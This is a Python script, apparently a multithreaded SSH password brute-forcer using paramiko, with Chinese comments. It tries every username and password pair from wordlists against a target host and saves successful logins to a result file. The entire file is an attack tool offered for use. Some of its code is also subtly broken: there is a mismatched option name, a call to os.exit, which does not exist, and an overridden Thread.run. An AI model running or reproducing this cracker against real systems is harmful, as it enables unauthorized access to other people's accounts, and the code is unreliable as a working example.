import optparse
import sys
import os
import threading
import paramiko

# 列表分块函数
def partition(list,num):
    step = int(len(list) / num)
    if step == 0:
        step = num
    partlist = [list[i:i+step] for i in range(0,len(list),step)]
    return partlist

#
def SshExploit(ip,usernameFile,passwordFile,threadNumber,sshPort):
    print("==============破解信息==============")
    print("IP:" + ip)
    print("UserName:" + usernameFile)
    print("PassWord:" + passwordFile)
    print("Threads:" + str(threadNumber))
    print("Port:" + sshPort)
    print("===================================")

    listUsername = [line.strip() for line in open(usernameFile)]
    listPassword = [line.strip() for line in open(passwordFile)]

    blockUsername = partition(listUsername, threadNumber)
    blockPassword = partition(listPassword, threadNumber)
    threads = []

    for sonUserBlock in blockUsername:
        for sonPwdBlock in blockPassword:
            work = ThreadWork(ip,sonUserBlock, sonPwdBlock,sshPort)
            workThread = threading.Thread(target=work.start)
            threads.append(workThread)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
class ThreadWork(threading.Thread):
    def __init__(self,ip,usernameBlocak, passwordBlocak,Port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = Port
        self.usernameBlocak = usernameBlocak
        self.passwordBlocak = passwordBlocak

    def run(self,username,password):
        '''
        用死循环防止因为 Error reading SSH protocol baner错误
        而出现线程没有验证账户和密码是否正确就被抛弃的情况
        '''
        while True:
            try:
                paramiko.util.log_to_file("SSHAttack.log")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sys.stdout.write("[*]ssh[{}:{}:{}] => {}\n".format(username,password,self.port,self.ip))
                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password, timeout=10)
                ssh.close()
                print("[+]success!!! username: {},password: {}".format(username, password))
                resultFile = open('result','a')
                resultFile.write("success!!!username: {}, password: {}".format(username, password))
                resultFile.close()
                os.exit(0)
            except paramiko.ssh_exception.AuthenticationException as e:
                break
            except paramiko.ssh_exception.SSHException as e:
                pass
    def start(self):
        for userItem in self.usernameBlocak:
            for pwdItem in self.passwordBlocak:
                self.run(userItem,pwdItem)
if __name__ == '__main__':
    print("\n#####################################")
    print("#            => mgl <=                #")
    print("#         SSH  experiment             #")
    print("#######################################")

    parser = optparse.OptionParser('usage: python %prog target [options] \n\n''Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n')
    parser.add_option('-i', '--ip',
                      dest='IP',
                      default='127.0.0.1',
                      type='string',
                      help='target IP')
    parser.add_option('-t', '--threads',
                      dest='threasNum',
                      default='10',
                      type='int',
                      help='Number of threads [default = 10]')
    parser.add_option('-u', '--username',
                      dest='userName',
                      default='./username',
                      type='string',
                      help='username file')
    parser.add_option('-p', '--password',
                      dest='passWord',
                      default='./password',
                      type='string',
                      help='password file')
    parser.add_option('-P', '--port',
                      dest='port',
                      default='22',
                      type='string',
                      help='ssh port')
    (options,args) = parser.parse_args()
    SshExploit(options.IP, options.userName, options.passWord, options.threadNum,options.port)